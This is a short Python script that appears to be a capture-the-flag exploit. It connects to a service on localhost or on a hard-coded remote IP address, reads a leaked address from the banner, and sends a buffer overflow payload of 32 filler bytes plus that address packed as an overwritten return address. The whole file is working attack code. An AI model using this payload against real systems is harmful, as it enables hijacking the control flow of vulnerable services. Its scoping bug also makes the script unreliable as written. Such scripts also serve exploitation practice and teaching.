import socket
import struct
import sys

target_addr = "localhost"
target_port = 10002

def main():
	if sys.argv[1] == '-r':
		target_addr = "133.130.115.234"

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target_addr,target_port))
	str = s.recv(1024)
	hex = int(str[24:34],16)
	ra = struct.pack("<I",hex)
	buf = 'A' * 32
	buf += ra
	buf += "\n"
	s.send(buf);
	str = s.recv(1024)
	print(str)


if __name__ == '__main__':
	main()
